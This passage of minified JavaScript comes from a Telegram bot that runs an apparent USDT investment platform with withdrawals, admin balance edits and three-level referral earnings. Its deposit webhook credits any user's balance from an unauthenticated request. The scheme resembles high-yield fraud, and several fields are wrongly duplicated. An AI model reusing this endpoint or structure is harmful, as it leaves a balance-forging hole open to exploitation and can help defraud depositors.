                                    "🎉 Congratulations! Your withdrawal request for " + s.amount + " USDT to wallet " + s.wallet + " has been approved and processed successfully. Thank you for using our platform! 🙌"
                                ),
                                await e.telegram.editMessageText(
                                    a,
                                    t,
                                    n,
                                    "🚨 New Withdrawal Request\n\nfrom user :" + s.user + " (" + s.name + ") (" + s.username + ") \n\n 💰 Amount: " + s.amount + "\n🗂️ Wallet Address: " + s.wallet + "\n Status : Approved\n\n TXID : " + i
                                ),
                                await e.answerCbQuery("The withdrawal request has been sent successfully.");
                        }
                    }
                } catch (e) {
                    console.log(e), te(e);
                }
            }),
            S.action(/^reject (.+)$/, async (e) => {
                try {
                    const t = e.update.callback_query.message.message_id,
                        a = e.update.callback_query.message.chat.id,
                        n = e.update.callback_query.inline_message_id,
                        r = e.match[1],
                        s = await ne.collection("withdraw").findOne({ id: r });
                    "rejected" === s.status || "approved" === s.status
                        ? await e.answerCbQuery("This action is no longer available,its already " + s.status)
                        : (await ne.collection("withdraw").updateOne({ id: r }, { $set: { status: "rejected" } }),
                          await ne.collection("info").updateOne({ user: parseInt(s.user) }, { $inc: { balance: s.amount } }),
                          console.log(r, s.amount),
                          await e.telegram.sendMessage(s.user, "Your withdrawal request has been rejected."),
                          await e.telegram.editMessageText(
                              a,
                              t,
                              n,
                              "🚨 New Withdrawal Request\n\nfrom user :" + s.user + " (" + s.name + ") (" + s.username + ") \n\n 💰 Amount: " + s.amount + "\n🗂️ Wallet Address: " + s.wallet + "\n Status : Rejected"
                          ),
                          await e.answerCbQuery("The withdrawal request has been rejected."));
                } catch (e) {
                    console.log(e), te(e);
                }
            }),
            Z.on("text", async (e) => {
                try {
                    const t = "chabal",
                        a = e.message.text,
                        n = a.split(" ")[0],
                        r = a.split(" ")[1],
                        s = a.split(" ")[2];
                    if ("⬅️ Back" === a) we(e);
                    else if (void 0 === n || void 0 === r || void 0 === s) ue(e, "*⚠️ Please provide Telegram ID, amount, and balance type (depositBalance or balance)*", { reply_markup: { keyboard: re, resize_keyboard: !0 } });
                    else if (isNaN(n) || isNaN(r)) ue(e, "*🚫 Invalid amount or Telegram ID*", { reply_markup: { keyboard: re, resize_keyboard: !0 } });
                    else if ("depositBalance" !== s && "balance" !== s) ue(e, "*🚫 Invalid balance type. Must be 'depositBalance' or 'balance'*", { reply_markup: { keyboard: re, resize_keyboard: !0 } });
                    else {
                        const t = parseInt(n),
                            a = await ne.collection("info").findOne({ user: t });
                        if (a) {
                            const n = a[s],
                                i = parseFloat(n) + parseFloat(r);
                            await ne.collection("info").updateOne({ user: t }, { $set: { [s]: i } }),
                                ue(e, `*✅ Successfully updated ${s} of [${t}](tg://user?id=${t}) from ${fe(n, 4)} ${v} to ${fe(i, 4)} ${v}*`, { reply_markup: { keyboard: re, resize_keyboard: !0 } }),
                                de(t, `*💰 Admin has updated your ${s} by ${fe(r, 4)} ${v}. Your new ${s} is ${fe(i, 4)} ${v}*`, { parse_mode: "Markdown" });
                        } else ue(e, "*⛔ User not found in our database*", { reply_markup: { keyboard: re, resize_keyboard: !0 } });
                    }
                    e.scene.leave(t);
                } catch (e) {
                    te(e);
                }
            }),
            V.on("text", async (e) => {
                try {
                    if ("⬅️ Back" == e.message.text) we(e);
                    else {
                        const t = parseInt(e.message.text);
                        let a = await ne.collection("info").findOne({ user: t });
                        if (a) {
                            let n = `🐥 *User:* [${t}](tg://user?id=${t})\n\n`;
                            (n += `💰 *Balance:* ${a.balance} USDT\n`),
                                (n += `💼 *Wallet:* ${a.wallet}\n`),
                                (n += `🔑 *Deposit Address:* ${a.depositAddress}\n`),
                                (n += `💳 *Deposit balance:* ${a.depositBalance} USDT\n`),
                                (n += `📊 *Active Investments:* ${a.activeInvestments}\n`),
                                (n += `🚀 *Total Profit:* ${a.totalProfit} USDT\n`),
                                (n += `💸 *Total Affiliate Bonus:* ${a.totalAffiliateBonus} USDT\n\n`),
                                (n += "User Referral details\n"),
                                (n += `level 1 count *Users:* ${a.referlvl1user} \n`),
                                (n += `level 2 count *Users:* ${a.referlvl1user} \n`),
                                (n += `level 3 count *Users:* ${a.referlvl1user} \n\n`),
                                (n += "User Upliner details\n"),
                                (n += `level 1 *User:* [${a.referlvl1user}](tg://user?id=${a.referlvl1user}) \n`),
                                (n += `level 2 *User:*[${a.referlvl1user}](tg://user?id=${a.referlvl2user}) \n`),
                                (n += `level 3 *User:* [${a.referlvl1user}](tg://user?id=${a.referlvl3user}) \n`),
                                ue(e, n, { reply_markup: { keyboard: re, resize_keyboard: !0 } });
                            let r = await ne.collection("userdeposits").findOne({ user: t });
                            if (r) {
                                const t = r.deposits.length,
                                    a = Math.ceil(t / 10);
                                let n = t - 1;
                                for (let t = 0; t < a; t++) {
                                    let a = `💰 * Deposit History:* (${n + 1}-${Math.max(0, n - 9)})\n\n`;
                                    for (let e = 0; e < 10 && n >= 0; e++) {
                                        const s = r.deposits[n],
                                            i = s.date,
                                            o = s.txId;
                                        (a += `*${e + 1 + 10 * t})* Amount: ${s.amount} USDT\n    Date: ${i}\n    Tx ID: [${o}](${o})\n    Block Number: ${s.blockNumber}\n\n`), n--;
                                    }
                                    ue(e, a, { disable_web_page_preview: !0 });
                                }
                            } else e.reply("🙁 have no deposit history yet!");
                            let s = await ne.collection("withdraw").find({ user: t }).toArray();
                            if (0 === s.length) e.reply("🙁  have no withdrawal history yet!");
                            else {
                                const t = s.length,
                                    a = Math.ceil(t / 10);
                                let n = t - 1;
                                for (let t = 0; t < a; t++) {
                                    let a = `💸 * Withdrawal History:* (${n + 1}-${Math.max(0, n - 9)})\n\n`;
                                    for (let e = 0; e < 10 && n >= 0; e++) {
                                        const r = s[n],
                                            i = r.date.toLocaleString("en-US", { timeZone: "UTC" }),
                                            o = "Pending" !== r.txId ? `[${r.txId}](${r.txId})` : "PendingTransaction";
                                        (a += `*${e + 1 + 10 * t})* Amount: ${r.amount} USDT\n    Date: ${i}\n    Tx ID: ${o}\n    Wallet: ${r.wallet}\n    Status: ${r.status}\n\n`), n--;
                                    }
                                    e.replyWithMarkdown(a, { disable_web_page_preview: !0 });
                                }
                            }
                            let i = await ne.collection("userinvestmentinlist").findOne({ user: t });
                            if (!i || !i.investments || 0 === i.investments.length) return void e.reply("🙁 have no investment or withdrawal history yet!");
                            const o = i.investments.length,
                                l = Math.ceil(o / 10);
                            let d = o - 1;
                            for (let t = 0; t < l; t++) {
                                let a = `💰 * Investment History:* (${d + 1}-${Math.max(0, d - 9)})\n\n`;
                                for (let e = 0; e < 10 && d >= 0; e++) {
                                    const n = i.investments[d],
                                        r = new Date(n.starttime).toLocaleDateString(),
                                        s = new Date(n.endtime).toLocaleDateString();
                                    let o = "";
                                    if ("completed" !== n.status) {
                                        const e = n.endtime - Date.now();
                                        o = `${Math.floor(e / 36e5)}h ${Math.floor((e % 36e5) / 6e4)}m ${Math.floor((e % 6e4) / 1e3)}s`;
                                    }
                                    (a += `*${e + 1 + 10 * t})* Amount: ${n.amount} USDT\n    Start Date: ${r}\n    End Date: ${s}`), "" !== o && (a += `\n    Remaining Time: ${o}`), (a += `\n    Status: ${n.status}\n\n`), d--;
                                }
                                e.replyWithMarkdown(a, { disable_web_page_preview: !0 });
                            }
                        } else ue(e, "*⛔User Not Found In Our Database*", { reply_markup: { keyboard: re, resize_keyboard: !0 } });
                    }
                    e.scene.leave(t);
                } catch (e) {
                    te(e);
                }
            }),
            S.command("panel", async (e) => {
                try {
                    if (!w.includes(e.from.id)) return;
                    let r = await ne.collection("admin").find({ admin: "admin" }).toArray();
                    r[0].ref, r[0].mini, r[0].max, r[0].tax;
                    let s = r[0].botstat,
                        i = r[0].withstat;
                    if ("Active" === s) var t = "✅ Active";
                    else t = "⛔️ Disable";
                    if ("On" == i) var a = "✅ On";
                    else a = "⛔️ Off";
                    r[0].mid, r[0].mkey, r[0].subid;
                    var n = [
                        [
                            { text: "🛑Change Balance", callback_data: "change_balance" },
                            { text: "🧾Get Details", callback_data: "get_details" },
                        ],
                        [
                            { text: "🟢Bot:" + t, callback_data: "bot_status" },
                            { text: "🟢Withdraw:" + a, callback_data: "with_status" },
                        ],
                        [{ text: "Pending Withdrawls", callback_data: "pendingwithdraw" }],
                        [{ text: "get ref details", callback_data: "getref" }],
                    ];
                    let o = await ne.collection("withdraw").find({ status: "pending" }).toArray();
                    ue(e, "*👋 Hey " + e.from.first_name + "\n🤘🏻Welcome To Admin Panel\n\nPending Withdraws : " + o.length + "\n🤖 Bot Status:" + t + "\n\t\t\t\t📤 Withdrawals:" + a + "*", { reply_markup: { inline_keyboard: n } });
                } catch (e) {
                    te(e);
                }
            }),
            V.on("text", async (e) => {
                try {
                    if ("⬅️ Back" == e.message.text) we(e);
                    else {
                        const t = parseInt(e.message.text);
                        let a = await ne.collection("info").findOne({ user: t });
                        if (a) {
                            let n = `🐥 *User:* [${t}](tg://user?id=${t})\n\n`;
                            (n += `💰 *Balance:* ${a.balance} USDT\n`),
                                (n += `💼 *Wallet:* ${a.wallet}\n`),
                                (n += `🔑 *Deposit Address:* ${a.depositAddress}\n`),
                                (n += `💳 *Deposit balance:* ${a.depositBalance} USDT\n`),
                                (n += `📊 *Active Investments:* ${a.activeInvestments}\n`),
                                (n += `🚀 *Total Profit:* ${a.totalProfit} USDT\n`),
                                (n += `💸 *Total Affiliate Bonus:* ${a.totalAffiliateBonus} USDT\n\n`),
                                (n += "User Referral details\n"),
                                (n += `level 1 count *Users:* ${a.referlvl1user} \n`),
                                (n += `level 2 count *Users:* ${a.referlvl1user} \n`),
                                (n += `level 3 count *Users:* ${a.referlvl1user} \n\n`),
                                (n += "User Upliner details\n"),
                                (n += `level 1 *User:* [${a.referlvl1user}](tg://user?id=${a.referlvl1user}) \n`),
                                (n += `level 2 *User:*[${a.referlvl1user}](tg://user?id=${a.referlvl2user}) \n`),
                                (n += `level 3 *User:* [${a.referlvl1user}](tg://user?id=${a.referlvl3user}) \n`),
                                ue(e, n, { reply_markup: { keyboard: re, resize_keyboard: !0 } });
                            let r = await ne.collection("userdeposits").findOne({ user: t });
                            if (r) {
                                const t = r.deposits.length,
                                    a = Math.ceil(t / 10);
                                let n = t - 1;
                                for (let t = 0; t < a; t++) {
                                    let a = `💰 * Deposit History:* (${n + 1}-${Math.max(0, n - 9)})\n\n`;
                                    for (let e = 0; e < 10 && n >= 0; e++) {
                                        const s = r.deposits[n],
                                            i = s.date,
                                            o = s.txId;
                                        (a += `*${e + 1 + 10 * t})* Amount: ${s.amount} USDT\n    Date: ${i}\n    Tx ID: [${o}](${o})\n    Block Number: ${s.blockNumber}\n\n`), n--;
                                    }
                                    ue(e, a, { disable_web_page_preview: !0 });
                                }
                            } else e.reply("🙁 have no deposit history yet!");
                            let s = await ne.collection("withdraw").find({ user: t }).toArray();
                            if (0 === s.length) e.reply("🙁  have no withdrawal history yet!");
                            else {
                                const t = s.length,
                                    a = Math.ceil(t / 10);
                                let n = t - 1;
                                for (let t = 0; t < a; t++) {
                                    let a = `💸 * Withdrawal History:* (${n + 1}-${Math.max(0, n - 9)})\n\n`;
                                    for (let e = 0; e < 10 && n >= 0; e++) {
                                        const r = s[n],
                                            i = r.date.toLocaleString("en-US", { timeZone: "UTC" }),
                                            o = "Pending" !== r.txId ? `[${r.txId}](${r.txId})` : "PendingTransaction";
                                        (a += `*${e + 1 + 10 * t})* Amount: ${r.amount} USDT\n    Date: ${i}\n    Tx ID: ${o}\n    Wallet: ${r.wallet}\n    Status: ${r.status}\n\n`), n--;
                                    }
                                    e.replyWithMarkdown(a, { disable_web_page_preview: !0 });
                                }
                            }
                            let i = await ne.collection("userinvestmentinlist").findOne({ user: t });
                            if (!i || !i.investments || 0 === i.investments.length) return void e.reply("🙁 have no investment or withdrawal history yet!");
                            const o = i.investments.length,
                                l = Math.ceil(o / 10);
                            let d = o - 1;
                            for (let t = 0; t < l; t++) {
                                let a = `💰 * Investment History:* (${d + 1}-${Math.max(0, d - 9)})\n\n`;
                                for (let e = 0; e < 10 && d >= 0; e++) {
                                    const n = i.investments[d],
                                        r = new Date(n.starttime).toLocaleDateString(),
                                        s = new Date(n.endtime).toLocaleDateString();
                                    let o = "";
                                    if ("completed" !== n.status) {
                                        const e = n.endtime - Date.now();
                                        o = `${Math.floor(e / 36e5)}h ${Math.floor((e % 36e5) / 6e4)}m ${Math.floor((e % 6e4) / 1e3)}s`;
                                    }
                                    (a += `*${e + 1 + 10 * t})* Amount: ${n.amount} USDT\n    Start Date: ${r}\n    End Date: ${s}`), "" !== o && (a += `\n    Remaining Time: ${o}`), (a += `\n    Status: ${n.status}\n\n`), d--;
                                }
                                e.replyWithMarkdown(a, { disable_web_page_preview: !0 });
                            }
                        } else ue(e, "*⛔User Not Found In Our Database*", { reply_markup: { keyboard: re, resize_keyboard: !0 } });
                    }
                    e.scene.leave(t);
                } catch (e) {
                    te(e);
                }
            }),
            S.action("change_balance", (e) => {
                try {
                    e.deleteMessage(),
                        ue(e, "*💡 Send User Telegram Id & Amount\n\n⚠️ Use Format : \n\n*`" + e.from.id + " 10 depositBalance` \n\n `" + e.from.id + " 10 balance`", { reply_markup: { keyboard: [["⬅️ Back"]], resize_keyboard: !0 } }),
                        e.scene.enter("chabal");
                } catch (e) {
                    te(e);
                }
            }),
            S.action("getref", (e) => {
                try {
                    e.deleteMessage(), ue(e, "💡 Send User Telegram Id \n\n", { reply_markup: { keyboard: [["⬅️ Back"]], resize_keyboard: !0 } }), e.scene.enter("refdetails");
                } catch (e) {
                    te(e);
                }
            }),
            S.action("get_details", (e) => {
                try {
                    e.deleteMessage(), ue(e, "*💡 Send User Telegram Id *", { reply_markup: { keyboard: [["⬅️ Back"]], resize_keyboard: !0 } }), e.scene.enter("getdetails");
                } catch (e) {
                    te(e);
                }
            }),
            S.action("bot_status", async (e) => {
                try {
                    let s = await ne.collection("admin").find({ admin: "admin" }).toArray(),
                        i = await ne.collection("withdraw").find({ status: "pending" }).toArray();
                    if ("Active" == s[0].botstat) {
                        ne.collection("admin").updateOne({ admin: "admin" }, { $set: { botstat: "Disable" } });
                        var t = "⛔️ Disable";
                    } else (t = "✅ Active"), ne.collection("admin").updateOne({ admin: "admin" }, { $set: { botstat: "Active" } });
                    var a = s;
                    if ((s[0].ref, s[0].mini, s[0].max, s[0].tax, "On" == s[0].withstat)) var n = "✅ On";
                    else n = "⛔️ Off";
                    a[0].mid, a[0].mkey, a[0].subid;
                    var r = [
                        [
                            { text: "🛑Change Balance", callback_data: "change_balance" },
                            { text: "🧾Get Details", callback_data: "get_details" },
                        ],
                        [
                            { text: "🟢Bot:" + t, callback_data: "bot_status" },
                            { text: "🟢Withdraw:" + n, callback_data: "with_status" },
                        ],
                        [{ text: "Pending Withdrawls", callback_data: "pendingwithdraw" }],
                        [{ text: "get ref details", callback_data: "getref" }],
                    ];
                    ce(e, "*👋 Hey " + e.from.first_name + "\n🤘🏻Welcome To Admin Panel\n\nPending Withdraws : " + i.length + "\n🤖 Bot Status:" + t + "\n\t\t\t\t📤 Withdrawals:" + n + "*", {
                        reply_markup: { inline_keyboard: r },
                        parse_mode: "Markdown",
                    });
                } catch (e) {
                    te(e);
                }
            }),
            J.on("text", async (e) => {
                try {
                    if ("⬅️ Back" == e.message.text) we(e);
                    else {
                        function t(e, t) {
                            const a = [];
                            for (let n = 0; n < e.length; n += t) {
                                const r = e.slice(n, n + t);
                                a.push(r);
                            }
                            return a;
                        }
                        const a = parseInt(e.message.text),
                            n = await ne.collection("lvl1users").findOne({ user: a });
                        let r = "Level 1 Details\n";
                        if (n && n.registeredUsers.length > 0) {
                            let d = n.registeredUsers.slice(0, 60);
                            for (const u of d) r += `\n- User ID: [${u.firstname}](tg://user?id=${u.userid}) his deposits: ${u.deposits}$ ,You earned: ${fe(u.earnings, 4)}$ USDT`;
                            await e.replyWithMarkdown(r, { parse_mode: "Markdown" });
                            let c = t(n.registeredUsers.slice(60), 60);
                            for (const m of c) {
                                let f = "Level 1 Details (Continued)\n";
                                for (const p of m) f += `\n- User ID: [${p.firstname}](tg://user?id=${p.userid}) his deposits: ${p.deposits}$ ,You earned: ${fe(p.earnings, 4)}$ USDT`;
                                await e.replyWithMarkdown(f, { parse_mode: "Markdown" });
                            }
                        } else (r += "\nNo Referrals in lvl 1"), await e.replyWithMarkdown(r, { parse_mode: "Markdown" });
                        const s = await ne.collection("lvl2users").findOne({ user: a });
                        let i = "Level 2 Details\n";
                        if (s && s.registeredUsers.length > 0) {
                            let y = s.registeredUsers.slice(0, 60);
                            for (const v of y) i += `\n- User ID: [${v.firstname}](tg://user?id=${v.userid}) his deposits: ${v.deposits}$ ,You earned: ${fe(v.earnings, 4)}$ USDT`;
                            await e.replyWithMarkdown(i, { parse_mode: "Markdown" });
                            let w = t(s.registeredUsers.slice(60), 60);
                            for (const h of w) {
                                let g = "Level 2 Details (Continued)\n";
                                for (const k of h) g += `\n- User ID: [${k.firstname}](tg://user?id=${k.userid}) his deposits: ${k.deposits}$ ,You earned: ${fe(k.earnings, 4)}$ USDT`;
                                await e.replyWithMarkdown(g, { parse_mode: "Markdown" });
                            }
                        } else (i += "\nNo Referrals in lvl 2"), await e.replyWithMarkdown(i, { parse_mode: "Markdown" });
                        const o = await ne.collection("lvl3users").findOne({ user: a });
                        let l = "Level 3 Details\n";
                        if (o && o.registeredUsers.length > 0) {
                            let b = o.registeredUsers.slice(0, 60);
                            for (const $ of b) l += `\n- User ID: [${$.firstname}](tg://user?id=${$.userid}) his deposits: ${$.deposits}$ ,You earned: ${fe($.earnings, 4)}$ USDT`;
                            await e.replyWithMarkdown(l, { parse_mode: "Markdown" });
                            let _ = t(o.registeredUsers.slice(60), 60);
                            for (const D of _) {
                                let x = "Level 3 Details (Continued)\n";
                                for (const T of D) x += `\n- User ID: [${T.firstname}](tg://user?id=${T.userid}) his deposits: ${T.deposits}$ ,You earned: ${fe(T.earnings, 4)}$ USDT`;
                                await e.replyWithMarkdown(x, { parse_mode: "Markdown" });
                            }
                        } else (l += "\nNo Referrals in lvl 3"), await e.replyWithMarkdown(l, { parse_mode: "Markdown" }), e.scene.leave("refdetails");
                    }
                } catch (U) {
                    te(U);
                }
            }),
            S.action("with_status", async (e) => {
                try {
                    let s = await ne.collection("withdraw").find({ status: "pending" }).toArray(),
                        i = await ne.collection("admin").find({ admin: "admin" }).toArray(),
                        o = i[0].botstat;
                    if ("On" == i[0].withstat) {
                        ne.collection("admin").updateOne({ admin: "admin" }, { $set: { withstat: "Off" } });
                        var t = "⛔️ Off";
                    } else (t = "✅ On"), ne.collection("admin").updateOne({ admin: "admin" }, { $set: { withstat: "On" } });
                    var a = i;
                    if ("Active" == o) var n = "✅ Active";
                    else n = "⛔️ Disable";
                    a[0].mid, a[0].mkey, a[0].subid;
                    var r = [
                        [
                            { text: "🛑Change Balance", callback_data: "change_balance" },
                            { text: "🧾Get Details", callback_data: "get_details" },
                        ],
                        [
                            { text: "🟢Bot:" + n, callback_data: "bot_status" },
                            { text: "🟢Withdraw:" + t, callback_data: "with_status" },
                        ],
                        [{ text: "Pending Withdrawls", callback_data: "pendingwithdraw" }],
                        [{ text: "get ref details", callback_data: "getref" }],
                    ];
                    ce(e, "*👋 Hey " + e.from.first_name + "\n🤘🏻Welcome To Admin Panel\n\nPending Withdraws : " + s.length + "\n🤖 Bot Status:" + n + "\n\t\t\t\t📤 Withdrawals:" + t + "*", {
                        reply_markup: { inline_keyboard: r },
                        parse_mode: "Markdown",
                    });
                } catch (e) {
                    te(e);
                }
            }),
            ee.on("text", async (e) => {
                let t = await ne
                        .collection("info")
                        .find({}, { projection: { user: 1, _id: 0 } })
                        .toArray(),
                    a = e.message.text;
                if ("⬅️ Back" == a) return we(e), void e.scene.leave("broad");
                for (var n of (ue(e, "*✅ Broadcast Sended To All Users*", { reply_markup: { keyboard: re, resize_keyboard: !0 } }), t))
                    de(n.user, "*🔈 Broadcast By Admin*\n\n" + a, { parse_mode: "Markdown", disable_web_page_preview: !0 }).catch((e) => console.log(e));
                e.scene.leave("broad");
            }),
            S.command("broadcast", async (e) => {
                w.includes(e.from.id) && (e.reply("*💡 Send Message To Send Broadcast*", { parse_mode: "markdown", reply_markup: { keyboard: [["⬅️ Back"]], resize_keyboard: !0 } }), await e.scene.enter("broad"));
            }),
            M.post(
                "/:user",
                async (e, t) => {
                    const { user: a } = e.params,
                        n = e.body,
                        r = parseFloat(a),
                        s = n.txId,
                        i = parseFloat(n.amount),
                        o = n.blockNumber;
                    var l = await ne.collection("info").find({ user: r }).toArray();
                    await ne.collection("info").updateOne({ user: r }, { $inc: { depositBalance: i } }), await ne.collection("statistics").updateOne({}, { $inc: { totalDeposits: i } });
                    const d = { user: r },
                        c = { $push: { deposits: { txId: s, amount: i, blockNumber: o, date: new Date() } } };
                    await ne.collection("userdeposits").updateOne(d, c, { upsert: !0 }),
                        de(a, `   
🎉 Amazing news!\n\n💰💰 Your account has been credited with a whopping deposit of ${i} USDT! 💰💰 `, { parse_mode: "Markdown", disable_web_page_preview: !0 }),
                        await ne.collection("lvl1users").updateOne({ user: l[0].referlvl1user, "registeredUsers.userid": r }, { $inc: { "registeredUsers.$.deposits": i } }),
                        await ne.collection("lvl2users").updateOne({ user: l[0].referlvl2user, "registeredUsers.userid": r }, { $inc: { "registeredUsers.$.deposits": i } }),
                        await ne.collection("lvl3users").updateOne({ user: l[0].referlvl3user, "registeredUsers.userid": r }, { $inc: { "registeredUsers.$.deposits": i } }),
                        t.sendStatus(200);
                },
                M.get("/", (e, t) => {
                    t.send("API VERSION 1.1");
                })
            ),
            M.listen(process.env.PORT || 8888),
            console.log("Webhook server listening on port 8888");
    })();
})();
